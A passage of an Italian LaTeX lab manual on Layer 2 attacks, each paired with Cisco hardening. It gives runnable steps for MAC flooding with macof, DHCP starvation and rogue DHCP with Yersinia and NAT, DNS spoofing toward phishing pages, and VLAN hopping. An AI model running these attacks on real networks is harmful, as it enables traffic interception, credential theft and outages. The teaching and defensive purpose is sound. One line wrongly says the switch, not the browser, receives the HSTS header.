+moderne)}\label{approfondimento-https-e-hsts-le-difese-moderne}
+
+Anche se il DNS Spoofing ha successo, l\textquotesingle attaccante si
+scontrerà quasi sempre con due tecnologie che proteggono
+l\textquotesingle integrità del web.
+
+\paragraph{\texorpdfstring{\textbf{HTTPS (HyperText Transfer Protocol
+Secure)}}{HTTPS (HyperText Transfer Protocol Secure)}}\label{https-hypertext-transfer-protocol-secure}
+
+HTTPS cifra il traffico e utilizza \textbf{certificati SSL/TLS} per
+garantire l\textquotesingle identità del sito.
+
+\begin{itemize}
+\item
+  \textbf{Cosa succede:} Se dirottiamo la vittima che cerca
+  www.google.it sul nostro server web (Kali), il suo browser chiederà un
+  certificato valido per quel dominio.
+\item
+  \textbf{L\textquotesingle ostacolo:} Dato che non possediamo il
+  certificato firmato da una CA (Certificate Authority) per Google, il
+  browser mostrerà un enorme avviso di sicurezza (\textbf{"La
+  connessione non è privata"}). Se la vittima non forza manualmente
+  l\textquotesingle accesso, l\textquotesingle attacco fallisce.
+\end{itemize}
+
+\paragraph{\texorpdfstring{\textbf{HSTS (HTTP Strict Transport
+Security)}}{HSTS (HTTP Strict Transport Security)}}\label{hsts-http-strict-transport-security}
+
+L\textquotesingle HSTS è un meccanismo di policy di sicurezza che
+istruisce il browser a comunicare con un sito \textbf{esclusivamente}
+tramite HTTPS.
+
+\begin{itemize}
+\item
+  \textbf{Il funzionamento:} La prima volta che un utente visita un sito
+  (es. Facebook), lo switch riceve un header HSTS. Da quel momento, il
+  browser ricorderà per mesi (o anni) che quel sito non deve mai essere
+  caricato in HTTP semplice.
+\item
+  \textbf{Impatto sul DNS Spoofing:} Anche se
+  l\textquotesingle attaccante prova a fare "SSL Stripping" (forzare il
+  downgrade a HTTP), il browser si rifiuterà di caricare la pagina non
+  cifrata. Inoltre, in presenza di HSTS, gli errori di certificato sono
+  \textbf{non ignorabili}: l\textquotesingle utente non avrà nemmeno il
+  tasto "Procedi comunque".
+\end{itemize}
+
+\subsubsection{Fase di Difesa: Hardening del Cisco
+2960}\label{fase-di-difesa-hardening-del-cisco-2960}
+
+Ora che avete compreso quanto sia banale compromettere una rete
+"piatta", passiamo alla mitigazione. Vi collegherete in console al Cisco
+2960 per implementare due livelli di sicurezza fondamentali.
+
+\paragraph{Difesa 1: Port Security}\label{difesa-1-port-security}
+
+Il Port Security previene il MAC Flooding e limita i movimenti laterali
+di un attaccante, vincolando una porta a uno specifico MAC address.
+
+Accedete alla configurazione dell\textquotesingle interfaccia a cui è
+collegata la vittima (es. FastEthernet 0/1):
+
+Cisco CLI
+
+Switch\textgreater{} enable
+
+Switch\# configure terminal
+
+Switch(config)\# interface fa0/1
+
+Switch(config-if)\# switchport mode access
+
+Switch(config-if)\# switchport port-security
+
+Switch(config-if)\# switchport port-security maximum 1
+
+Switch(config-if)\# switchport port-security mac-address sticky
+
+Switch(config-if)\# switchport port-security violation restrict
+
+\begin{itemize}
+\item
+  \textbf{sticky:} Lo switch apprende dinamicamente il primo MAC address
+  che fa traffico sulla porta e lo salva in running-config come
+  legittimo.
+\item
+  \textbf{restrict:} Se l\textquotesingle attaccante prova a fare
+  spoofing usando un MAC address diverso (o se si collega un altro PC
+  alla stessa porta), lo switch droppa i pacchetti illeciti e genera un
+  log SNMP/Syslog senza spegnere la porta (a differenza
+  dell\textquotesingle opzione shutdown).
+\end{itemize}
+
+\paragraph{Difesa 2: Segmentazione tramite
+VLAN}\label{difesa-2-segmentazione-tramite-vlan}
+
+L\textquotesingle ARP Spoofing funziona solo se attaccante e vittima
+condividono lo stesso dominio di broadcast. Metterli in VLAN separate
+distrugge alla base l\textquotesingle efficacia di questo attacco Layer
+2.
+
+Creiamo due VLAN e assegniamo le porte:
+
+Cisco CLI
+
+Switch(config)\# vlan 10
+
+Switch(config-vlan)\# name IT\_ADMIN
+
+Switch(config-vlan)\# exit
+
+Switch(config)\# vlan 20
+
+Switch(config-vlan)\# name GUEST
+
+Switch(config-vlan)\# exit
+
+Switch(config)\# interface fa0/1
+
+Switch(config-if)\# switchport access vlan 10
+
+Switch(config-if)\# exit
+
+Switch(config)\# interface fa0/2
+
+Switch(config-if)\# switchport access vlan 20
+
+Switch(config-if)\# end
+
+\paragraph{Step di Verifica}\label{step-di-verifica}
+
+Per assicurarvi che le difese siano attive e funzionanti, utilizzate i
+comandi di verifica (show) dal privilegio exec:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Verifica Port Security:}
+
+  Cisco CLI
+
+  Switch\# show port-security interface fa0/1
+
+  \emph{Analizzate l\textquotesingle output: Verificate che lo stato sia
+  Secure-up, che il Maximum MAC Addresses sia 1 e osservate il counter
+  dei Security Violation dopo aver provato a forzare un cambio di MAC
+  address da Kali.}
+\item
+  \textbf{Verifica VLAN:}
+
+  Cisco CLI
+
+  Switch\# show vlan brief
+
+  \emph{Assicuratevi che le porte fa0/1 e fa0/2 siano isolate nelle
+  rispettive VLAN.}
+\item
+  \textbf{Il Test Definitivo:} Provate a lanciare nuovamente
+  l\textquotesingle attacco arpspoof da Kali. Dato che i broadcast ARP
+  (FF:FF:FF:FF:FF:FF) non superano i confini della VLAN, le \emph{ARP
+  Request/Reply} dell\textquotesingle attaccante non raggiungeranno mai
+  la vittima, neutralizzando del tutto l\textquotesingle attacco.
+\end{enumerate}
+
+\subsubsection{Rilevamento e Difesa Lato Host (Sulla Macchina
+Vittima)}\label{rilevamento-e-difesa-lato-host-sulla-macchina-vittima}
+
+Se l\textquotesingle infrastruttura di rete non è protetta da misure
+come la Dynamic ARP Inspection, la macchina vittima può comunque
+utilizzare i comandi del proprio sistema operativo per rilevare un
+attacco di Man-in-the-Middle in corso e per immunizzarsi.
+
+\paragraph{Step 1: L\textquotesingle Indicatore di Compromissione
+(Rilevamento)}\label{step-1-lindicatore-di-compromissione-rilevamento}
+
+Prima che il Red Team lanci l\textquotesingle attacco, chiedete allo
+studente che fa la vittima di aprire il prompt dei comandi e
+visualizzare la propria cache ARP "pulita":
+
+\begin{itemize}
+\item
+  \textbf{Comando (Windows/Linux):} arp -a
+\item
+  \emph{Fate annotare il MAC address associato all\textquotesingle IP
+  del Default Gateway.}
+\end{itemize}
+
+Una volta che l\textquotesingle attaccante ha avviato arpspoof, fate
+ripetere il comando arp -a alla vittima. Gli studenti dovranno notare
+l\textquotesingle evidenza dell\textquotesingle avvelenamento:
+\textbf{L\textquotesingle indirizzo IP del Gateway e
+l\textquotesingle indirizzo IP della macchina Kali (attaccante)
+presenteranno ora l\textquotesingle identico MAC Address.} Questo è il
+segnale inequivocabile che il traffico sta venendo dirottato.
+
+\paragraph{Step 2: La Mitigazione Locale (Tabelle ARP
+Statiche)}\label{step-2-la-mitigazione-locale-tabelle-arp-statiche}
+
+Per difendersi dall\textquotesingle attacco senza toccare le
+configurazioni dello switch, la vittima può forzare il proprio sistema
+operativo a ignorare i pacchetti ARP dinamici ingannevoli, inserendo una
+regola statica (hardcoded) per il Default Gateway.
+
+Fate pulire la cache inquinata e inserite la regola statica (sono
+necessari i privilegi di Amministratore/Root):
+
+\textbf{Su Windows (Terminale come Amministratore):}
+
+DOS
+
+arp -d *
+
+arp -s \textless IP\_DEL\_GATEWAY\textgreater{}
+\textless MAC\_REALE\_DEL\_GATEWAY\textgreater{}
+
+\emph{(Nota per i docenti: Su Windows 10/11, il comando arp classico
+potrebbe essere deprecato a favore di netsh. In tal caso usare: netsh
+interface ipv4 add neighbors "Nome Scheda"
+\textless IP\_GATEWAY\textgreater{} \textless MAC\_REALE\textgreater)}
+
+\textbf{Su Linux/Kali:}
+
+Bash
+
+sudo ip -s -s neigh flush all
+
+sudo arp -s \textless IP\_DEL\_GATEWAY\textgreater{}
+\textless MAC\_REALE\_DEL\_GATEWAY\textgreater{}
+
+\paragraph{Step di Verifica Finale}\label{step-di-verifica-finale}
+
+Con la voce statica inserita, se la vittima lancia un arp -a, vedrà che
+il tipo di record per il gateway è passato da "dinamico" a "statico".
+
+Se a questo punto l\textquotesingle attaccante riprova a lanciare
+arpspoof, il sistema operativo della vittima scarterà semplicemente i
+pacchetti falsificati, mantenendo il traffico saldamente indirizzato
+verso il MAC address reale del router. L\textquotesingle attacco è
+neutralizzato.
+
+\subsection{Denial of Service a Layer 2 - MAC
+Flooding}\label{denial-of-service-a-layer-2---mac-flooding}
+
+Mentre gli attacchi precedenti miravano a intercettare o dirottare il
+traffico, il \textbf{MAC Flooding} punta a mandare in crisi
+l\textquotesingle hardware dello switch, forzandolo a degradare le sue
+prestazioni di sicurezza.
+
+\subsubsection{Teoria: La CAM Table (Content Addressable
+Memory)}\label{teoria-la-cam-table-content-addressable-memory}
+
+Ogni switch mantiene una tabella interna chiamata \textbf{CAM Table} (o
+\emph{MAC Address Table}). Questa tabella associa ogni indirizzo MAC
+alla porta fisica a cui è collegato.
+
+\begin{itemize}
+\item
+  \textbf{Il limite:} La memoria dello switch è finita (es. un Cisco
+  2960 può contenere circa 8.000 indirizzi).
+\item
+  \textbf{L\textquotesingle attacco:} Se un attaccante inonda lo switch
+  con migliaia di frame Ethernet, ognuno con un MAC address sorgente
+  casuale e falso, la CAM Table si riempie in pochi secondi.
+\item
+  \textbf{Fail-open mode:} Quando la tabella è piena, lo switch non sa
+  più dove mandare i pacchetti. Per non interrompere il servizio, entra
+  in modalità "fail-open" e inizia a comportarsi come un \textbf{Hub}:
+  inoltra ogni pacchetto in arrivo su \textbf{tutte le porte}
+  (flooding).
+\end{itemize}
+
+\subsubsection{Laboratorio: Esecuzione con
+macof}\label{laboratorio-esecuzione-con-macof}
+
+Useremo \textbf{macof}, un tool della suite dsniff progettato
+specificamente per generare rumore a Layer 2.
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Lancio dell\textquotesingle attacco da Kali:} Apri il
+  terminale e specifica l\textquotesingle interfaccia di rete:
+
+  Bash
+
+  \# Inizia a inondare lo switch con MAC address casuali
+
+  sudo macof -i eth0
+
+  \emph{Vedrai scorrere migliaia di righe con indirizzi IP e MAC
+  generati casualmente.}
+\item
+  \textbf{Verifica sullo Switch (Visualizzare la CAM):} Mentre
+  l\textquotesingle attacco è in corso, entra nella console dello switch
+  Cisco per osservare il disastro in tempo reale.
+
+  Cisco CLI
+
+  \# Visualizza l\textquotesingle intera tabella dei MAC address
+
+  Switch\# show mac address-table
+
+  \# Per vedere quanti indirizzi sono stati memorizzati (utile per
+  vedere il limite raggiunto)
+
+  Switch\# show mac address-table count
+
+  \emph{Noterai che la tabella si riempirà istantaneamente con MAC
+  address senza senso, tutti associati alla tua porta (es. Gi0/1).}
+\end{enumerate}
+
+\subsubsection{Analisi dei Risultati e
+Mitigazione}\label{analisi-dei-risultati-e-mitigazione}
+
+Una volta che la CAM è piena, l\textquotesingle attaccante può
+semplicemente lanciare \textbf{Wireshark} e vedrà transitare tutto il
+traffico della rete (anche quello non destinato a lui), proprio come se
+fosse collegato a un vecchio hub.
+
+\paragraph{Come bloccare il MAC
+Flooding?}\label{come-bloccare-il-mac-flooding}
+
+La soluzione definitiva è la \textbf{Port Security}. Questa funzione
+permette di limitare il numero di MAC address che possono essere appresi
+da una singola porta.
+
+\textbf{Comandi di Hardening sul 2960:}
+
+Cisco CLI
+
+Switch(config)\# interface range fa0/1 - 24
+
+Switch(config-if)\# switchport mode access
+
+Switch(config-if)\# switchport port-security
+
+Switch(config-if)\# switchport port-security maximum 2
+
+Switch(config-if)\# switchport port-security violation shutdown
+
+\emph{Con questa configurazione, se macof prova a inviare più di 2 MAC
+address differenti, lo switch spegne immediatamente la porta
+(err-disable), bloccando l\textquotesingle attaccante.}
+
+\subsubsection{Dynamic Host Configuration Protocol -
+DHCP}\label{dynamic-host-configuration-protocol---dhcp}
+
+Il Dynamic Host Configuration Protocol (DHCP) è uno dei servizi più
+critici e, paradossalmente, meno protetti di una rete locale. Essendo un
+protocollo basato su broadcast e privo di autenticazione, si presta a
+diverse tipologie di attacco che possono portare alla paralisi della
+rete (DoS) o all\textquotesingle intercettazione totale del traffico
+(MitM).
+
+\subsubsection{4.1 Tipologie di Attacchi
+DHCP}\label{tipologie-di-attacchi-dhcp}
+
+In ambito VA/PT, le principali minacce che analizzeremo sono:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{DHCP Starvation:} Un attacco di Denial of Service che
+  esaurisce tutti gli indirizzi IP disponibili nel pool del server
+  legittimo.
+\item
+  \textbf{Rogue DHCP Server:} L\textquotesingle introduzione di un
+  server non autorizzato che distribuisce parametri di rete malevoli
+  (Default Gateway e DNS controllati dall\textquotesingle attaccante).
+\item
+  \textbf{DHCP Spoofing/Release:} L\textquotesingle invio di messaggi
+  falsificati per terminare forzatamente i lease degli altri client o
+  per intercettare i messaggi di acknowledge.
+\end{enumerate}
+
+\subsubsection{4.2 DHCP Starvation: Teoria e
+Meccanica}\label{dhcp-starvation-teoria-e-meccanica}
+
+L\textquotesingle attacco di \textbf{Starvation} (fame/esaurimento)
+sfrutta la natura "generosa" del server DHCP. Quando un client entra in
+rete, invia un pacchetto \emph{DHCP Discover} in broadcast. Il server
+risponde con una \emph{DHCP Offer} riservando un IP per quel MAC
+address.
+
+L\textquotesingle attaccante utilizza un tool per inondare la rete con
+migliaia di pacchetti \emph{DHCP Discover}, ognuno contenente un
+\textbf{MAC address sorgente differente e casuale}. Il server DHCP (che
+sia un router 4321 o un server Windows) esaurirà in pochi secondi
+l\textquotesingle intero spazio di indirizzamento disponibile nel pool.
+
+\textbf{Risultato:} Qualsiasi nuovo dispositivo legittimo che tenterà di
+collegarsi alla rete rimarrà in stato di "Connettività limitata o
+assente" poiché non riceverà alcuna risposta dal server.
+
+\subsubsection{4.3 Laboratorio: Esecuzione con
+Yersinia}\label{laboratorio-esecuzione-con-yersinia}
+
+In questo scenario, utilizzeremo un \textbf{Cisco ISR 4321} come Server
+DHCP e una macchina \textbf{Kali Linux} come attaccante.
+
+\paragraph{1. Setup del Server (Cisco ISR
+4321)}\label{setup-del-server-cisco-isr-4321}
+
+Configurate il router per gestire il pool di indirizzi:
+
+Cisco CLI
+
+Router(config)\# ip dhcp pool LAN\_CLIENTS
+
+Router(dhcp-config)\# network 10.10.10.0 255.255.255.0
+
+Router(dhcp-config)\# default-router 10.10.10.1
+
+Router(dhcp-config)\# lease 0 1 ! Lease di un\textquotesingle ora per il
+test
+
+\paragraph{2. Esecuzione dell\textquotesingle attacco (Kali
+Linux)}\label{esecuzione-dellattacco-kali-linux}
+
+L\textquotesingle attaccante avvia Yersinia in modalità interattiva:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Avvio:} sudo yersinia -I
+\item
+  \textbf{Selezione Interfaccia:} Premi i, seleziona
+  l\textquotesingle interfaccia corretta e premi Invio.
+\item
+  \textbf{Cambio Protocollo:} Premi g, seleziona \textbf{DHCP} e premi
+  Invio.
+\item
+  \textbf{Lancio Attacco:}
+
+  \begin{itemize}
+  \item
+    Premi x per aprire il pannello degli attacchi.
+  \item
+    Seleziona 1 - sending RAW DHCP discover packets.
+  \item
+    Premi Invio.
+  \end{itemize}
+\item
+  \textbf{Verifica:} Osserva il contatore dei pacchetti inviati nella
+  schermata principale. Dopo circa 20 secondi, ferma
+  l\textquotesingle attacco premendo L, selezionando
+  l\textquotesingle attacco e cancellandolo (o chiudendo Yersinia con
+  q).
+\end{enumerate}
+
+\paragraph{3. Verifica sul Router}\label{verifica-sul-router}
+
+Eseguite il comando per vedere come il pool è stato saturato:
+
+Cisco CLI
+
+Router\# show ip dhcp binding
+
+! Vedrete centinaia di righe con MAC address casuali
+
+Router\# show ip dhcp server statistics
+
+! Il contatore delle "Active Bindings" dovrebbe corrispondere alla
+dimensione del pool
+
+\subsubsection{Blue Team: Strategie di
+Mitigazione}\label{blue-team-strategie-di-mitigazione}
+
+La difesa contro la Starvation deve essere implementata sullo
+\textbf{Switch di accesso (Cisco 2960)}, poiché è
+l\textquotesingle apparato che vede fisicamente il traffico dei client.
+
+\paragraph{1. DHCP Snooping}\label{dhcp-snooping}
+
+Questa è la difesa principale. Lo switch monitora i messaggi DHCP e
+permette i pacchetti di "risposta" (Offer/Ack) solo dalle porte fidate.
+
+Cisco CLI
+
+Switch(config)\# ip dhcp snooping
+
+Switch(config)\# ip dhcp snooping vlan 10
+
+! Definiamo la porta verso il router 4321 come TRUSTED
+
+Switch(config)\# interface Gi0/1
+
+Switch(config-if)\# ip dhcp snooping trust
+
+\paragraph{2. Rate Limiting (Protezione specifica dalla
+Starvation)}\label{rate-limiting-protezione-specifica-dalla-starvation}
+
+Per bloccare l\textquotesingle inondazione di pacchetti \emph{Discover}
+tipica di Yersinia, limitiamo il numero di pacchetti DHCP al secondo su
+ogni porta client.
+
+Cisco CLI
+
+Switch(config)\# interface range fa0/1 - 24
+
+Switch(config-if)\# ip dhcp snooping limit rate 10
+
+\emph{Se un attaccante supera i 10 pacchetti DHCP al secondo, lo switch
+metterà la porta in stato di \textbf{err-disable}, bloccando
+l\textquotesingle attacco sul nascere.}
+
+\paragraph{3. Port Security}\label{port-security}
+
+Poiché la Starvation di Yersinia usa MAC address falsificati
+all\textquotesingle interno del pacchetto DHCP, il \textbf{Port
+Security} (visto nel Cap. 3) è un alleato fondamentale: se lo switch
+vede troppi MAC sorgenti diversi provenire dalla stessa porta fisica,
+bloccherà l\textquotesingle interfaccia prima ancora che il server DHCP
+venga saturato.
+
+In un attacco di Rogue DHCP, l\textquotesingle attaccante non è
+obbligato a rispettare il piano di indirizzamento IP legittimo della
+rete. Anzi, in un contesto di Penetration Testing professionale, spesso
+è preferibile "spostare" la vittima su una \textbf{Shadow Network}: una
+sottorete completamente diversa da quella ufficiale (es. la vittima si
+aspetta la 10.10.10.0/24 e noi le assegniamo la 172.16.1.0/24).
+
+\paragraph{Perché utilizzare una Subnet
+diversa?}\label{perchuxe9-utilizzare-una-subnet-diversa}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Eliminazione dei conflitti IP:} Se usassimo la stessa subnet
+  del router legittimo, rischieremmo di assegnare un IP già in uso,
+  causando alert di sistema sulla vittima o collisioni ARP che
+  renderebbero l\textquotesingle attacco instabile e rumoroso.
+\item
+  \textbf{Isolamento Logico:} Spostando la vittima su una rete che
+  esiste solo nella memoria della macchina Kali,
+  l\textquotesingle attaccante diventa l\textquotesingle unica autorità
+  di routing. Il traffico della vittima non verrà mai intercettato o
+  "corretto" dai gateway legittimi (come l\textquotesingle ISR 4321 o
+  l\textquotesingle8000v).
+\item
+  \textbf{Trasparenza del MitM:} Attraverso il NAT (Network Address
+  Translation), l\textquotesingle attaccante può far navigare la vittima
+  verso internet facendole credere che tutto sia normale, mentre ogni
+  singolo pacchetto viene decifrato e analizzato localmente.
+\end{enumerate}
+
+\subsubsection{Laboratorio: Configurazione della Shadow Network su
+Kali}\label{laboratorio-configurazione-della-shadow-network-su-kali}
+
+Per rendere efficace questo attacco, la macchina Kali deve essere pronta
+a gestire una rete che ufficialmente non esiste sullo switch.
+
+\paragraph{Step 1: Alias IP sull\textquotesingle interfaccia di
+Kali}\label{step-1-alias-ip-sullinterfaccia-di-kali}
+
+Affinché Kali possa comunicare con la vittima sulla nuova rete (es.
+172.16.1.0/24), deve possedere un IP in quella subnet. Invece di
+cambiare l\textquotesingle IP principale, creiamo un alias:
+
+Bash
+
+\# Sostituisci eth0 con la tua interfaccia bridge
+
+sudo ip addr add 172.16.1.1/24 dev eth0
+
+\paragraph{Step 2: Abilitazione del NAT
+(Masquerading)}\label{step-2-abilitazione-del-nat-masquerading}
+
+Per permettere alla vittima di uscire su internet tramite Kali (che
+userà la sua connessione legittima), dobbiamo configurare il kernel
+Linux affinché faccia da router NAT:
+
+Bash
+
+\# 1. Abilita l\textquotesingle IP Forwarding (se non già fatto)
+
+sudo sysctl -w net.ipv4.ip\_forward=1
+
+\# 2. Configura IPTables per il masquerading
+
+\# Assumi che eth0 sia l\textquotesingle interfaccia verso la rete del
+lab
+
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+sudo iptables -A FORWARD -i eth0 -j ACCEPT
+
+\paragraph{Step 3: Lancio del Rogue Server con
+Yersinia}\label{step-3-lancio-del-rogue-server-con-yersinia}
+
+Configurate Yersinia (tasto x -\textgreater{} opzione 2) con i parametri
+della Shadow Network:
+
+\begin{itemize}
+\item
+  \textbf{Pool Start/End:} 172.16.1.100 - 172.16.1.200
+\item
+  \textbf{Subnet Mask:} 255.255.255.0
+\item
+  \textbf{Default Gateway:} 172.16.1.1 (L\textquotesingle IP di Kali)
+\item
+  \textbf{DNS Server:} 172.16.1.1 (O un DNS pubblico come 8.8.8.8)
+\end{itemize}
+
+\subsubsection{Verifica dell\textquotesingle Attacco
+(Post-Exploitation)}\label{verifica-dellattacco-post-exploitation}
+
+Una volta che la vittima ha ottenuto l\textquotesingle IP dalla Shadow
+Network, lo studente deve verificare la totale sottomissione del
+traffico:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Analisi sulla Vittima:}
+
+  \begin{itemize}
+  \item
+    ipconfig /all (Windows) o ip a (Linux): Verificare che
+    l\textquotesingle IP appartenga alla rete 172.16.1.x.
+  \item
+    tracert 8.8.8.8: Il primo salto deve essere obbligatoriamente
+    l\textquotesingle IP di Kali (172.16.1.1).
+  \end{itemize}
+\item
+  \textbf{Analisi sull\textquotesingle Attaccante (Kali):}
+
+  \begin{itemize}
+  \item
+    Eseguire tcpdump -i eth0 icmp e chiedere alla vittima di fare un
+    ping.
+  \item
+    \textbf{Risultato atteso:} Vedrete passare i pacchetti della vittima
+    attraverso Kali. Ora potete lanciare tool di sniffing come
+    \textbf{Wireshark} o \textbf{Bettercap} per catturare password o
+    sessioni HTTP.
+  \end{itemize}
+\end{enumerate}
+
+\begin{quote}
+\textbf{Nota di Troubleshooting:} Se la vittima riceve ancora
+l\textquotesingle IP dal router legittimo, significa che il router è
+stato più veloce di Kali. In questo caso, è necessario lanciare un
+attacco di \textbf{DHCP Starvation} (visto nel paragrafo 4.2) per
+"zittire" il router prima di riprovare con il Rogue Server.
+\end{quote}
+
+\subsubsection{DNS Spoofing: Il controllo nominale tramite
+DHCP}\label{dns-spoofing-il-controllo-nominale-tramite-dhcp}
+
+Mentre nel Capitolo 3 abbiamo visto come il DNS Spoofing richieda una
+tecnica di intercettazione attiva (ARP Poisoning),
+l\textquotesingle attacco tramite \textbf{Rogue DHCP Server} rende
+questa fase estremamente più semplice e "pulita".
+
+Poiché l\textquotesingle attaccante ha il controllo del campo
+\textbf{Option 6 (Domain Name Server)} nel pacchetto di risposta DHCP,
+può istruire la vittima a utilizzare la macchina Kali come unico server
+DNS della rete. In questo scenario, non c\textquotesingle è bisogno di
+intercettare query dirette a server terzi: la vittima invierà
+\emph{volontariamente} ogni sua richiesta di risoluzione
+all\textquotesingle attaccante.
+
+\textbf{La catena di compromissione:}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Rilevamento:} La vittima si connette e riceve un IP dal Rogue
+  Server.
+\item
+  \textbf{Configurazione:} Il resolver della vittima viene impostato
+  sull\textquotesingle IP di Kali (es. 172.16.1.1).
+\item
+  \textbf{Risoluzione:} Quando l\textquotesingle utente cerca
+  www.bancapopolare.it, la query UDP 53 arriva direttamente a Kali.
+\item
+  \textbf{Spoofing:} Un tool sull\textquotesingle attaccante (come
+  dnschef o bettercap) intercetta la richiesta e risponde con
+  l\textquotesingle IP di un server malevolo o di una pagina di
+  phishing, inoltrando invece le richieste "non interessanti" ai veri
+  DNS di Google (8.8.8.8) per non destare sospetti.
+\end{enumerate}
+
+\textbf{Vantaggio tattico:} A differenza dell\textquotesingle ARP
+Spoofing, che può causare instabilità di rete o essere rilevato da
+sistemi IDS (come l\textquotesingle Arpwatch), il DNS Spoofing via DHCP
+è estremamente silenzioso a livello di protocollo, poiché si basa su
+un\textquotesingle interazione client-server perfettamente standard. La
+vittima non vedrà mai "due MAC address per lo stesso IP", ma
+semplicemente un server DNS che sta facendo il suo lavoro.
+
+\subsubsection{Sicurezza delle VLAN e VLAN
+Hopping}\label{sicurezza-delle-vlan-e-vlan-hopping}
+
+In una rete aziendale, le VLAN servono a isolare il traffico (es. VLAN
+Guest separata dalla VLAN Server). Tuttavia, la segmentazione non è
+magica: se l\textquotesingle infrastruttura non è configurata
+correttamente, un attaccante può "saltare" i confini delle VLAN senza
+passare per un firewall. Questo è il \textbf{VLAN Hopping}.
+
+\subsubsection{Anatomia dell\textquotesingle Attacco: Il "Trunk
+Misconfiguration"}\label{anatomia-dellattacco-il-trunk-misconfiguration}
+
+Esistono due modi principali per eseguire il VLAN Hopping:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Switch Spoofing (Abuso del DTP):} L\textquotesingle attaccante
+  usa Yersinia per negoziare automaticamente un trunk.
+\item
+  \textbf{Fixed Trunk (Errore sistemistico):}
+  L\textquotesingle amministratore lascia accidentalmente una porta host
+  configurata come trunk. In questo caso, lo switch non chiede chi sei:
+  accetta qualsiasi pacchetto taggato gli arrivi.
+\end{enumerate}
+
+\subsubsection{Laboratorio: Infiltrazione e
+Post-Exploitation}\label{laboratorio-infiltrazione-e-post-exploitation}
+
+In questo scenario, simuliamo una porta switch (Gi0/1) erroneamente
+configurata come Trunk. Entreremo nella \textbf{VLAN 10 (Segreta)} e
+useremo Yersinia per attaccare i servizi interni.
+
+\paragraph{1. Setup dello Switch
+(vIOS-L2)}\label{setup-dello-switch-vios-l2}
+
+Creiamo la zona protetta e apriamo il "tunnel" per
+l\textquotesingle attaccante:
+
+Cisco CLI
+
+Switch\# conf t
+
+Switch(config)\# vlan 10
+
+Switch(config-vlan)\# name AREA\_PROTETTA
+
+Switch(config-vlan)\# exit
+
+Switch(config)\# interface GigabitEthernet 0/1
+
+Switch(config-if)\# switchport trunk encapsulation dot1q
+
+Switch(config-if)\# switchport mode trunk
+
+Switch(config-if)\# no shutdown
+
+\paragraph{2. Infiltrazione da Kali Linux (VLAN
+Hopping)}\label{infiltrazione-da-kali-linux-vlan-hopping}
+
+Dobbiamo dire al kernel Linux di gestire i tag 802.1Q per "parlare" con
+la VLAN 10.
+
+Bash
+
+\# Carichiamo il modulo per il tagging
+
+sudo modprobe 8021q
+
+\# Creiamo l\textquotesingle interfaccia virtuale legata alla VLAN 10
+
+sudo ip link add link eth0 name eth0.10 type vlan id 10
+
+sudo ip link set dev eth0.10 up
+
+\# Assegniamo un IP per muoverci nella nuova rete
+
+sudo ip addr add 10.10.10.100/24 dev eth0.10
+
+\paragraph{3. Attacco con Yersinia
+(Post-Exploitation)}\label{attacco-con-yersinia-post-exploitation}
+
+Ora che Kali è "dentro" la VLAN 10, possiamo usare Yersinia per creare
+il caos nel segmento protetto:
+
+\begin{itemize}
+\item
+  \textbf{STP Attack:} Diventare il Root Bridge della VLAN 10 per
+  intercettare tutto il traffico (Sniffing).
+
+  \begin{itemize}
+  \tightlist
+  \item
+    In Yersinia: g -\textgreater{} STP -\textgreater{} x -\textgreater{}
+    1 (Claiming Root Role).
+  \end{itemize}
+\item
+  \textbf{DHCP Starvation:} Esaurire gli IP della VLAN 10 per bloccare i
+  nuovi client legittimi.
+
+  \begin{itemize}
+  \tightlist
+  \item
+    In Yersinia: g -\textgreater{} DHCP -\textgreater{} x
+    -\textgreater{} 1 (Raw Discover packets).
+  \end{itemize}
+\end{itemize}
+
+\subsubsection{Blue Team: Mitigazione e
+Hardening}\label{blue-team-mitigazione-e-hardening}
+
+Proteggere le VLAN è semplice, ma richiede disciplina. Ecco le tre
+regole d\textquotesingle oro da applicare sul Catalyst 2960:
+
+\begin{longtable}[]{@{}
+  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.1948}}
+  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3247}}
+  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.4545}}@{}}
+\toprule\noalign{}
+\begin{minipage}[b]{\linewidth}\raggedright
+Azione
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Comando Cisco
+\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
+Perché farlo?
+\end{minipage} \\
+\midrule\noalign{}
+\endhead
+\bottomrule\noalign{}
+\endlastfoot
+\textbf{Forza modalità Access} & switchport mode access & Impedisce alla
+porta di diventare un Trunk, anche se riceve pacchetti DTP. \\
+\textbf{Disabilita DTP} & switchport nonegotiate & Spegne completamente
+il protocollo di negoziazione. \\
+\textbf{Cambia Native VLAN} & switchport trunk native vlan 999 &
+Impedisce l\textquotesingle attacco di \textbf{Double Tagging} (usando
+una VLAN inutilizzata). \\
+\end{longtable}
+
+Esporta in Fogli
+
+\paragraph{Configurazione di Hardening
+consigliata:}\label{configurazione-di-hardening-consigliata}
+
+Cisco CLI
+
+Switch(config)\# interface range fa0/1 - 24
+
+Switch(config-if)\# switchport mode access
+
+Switch(config-if)\# switchport nonegotiate
+
+Switch(config-if)\# spanning-tree bpduguard enable
+
+\end{document}
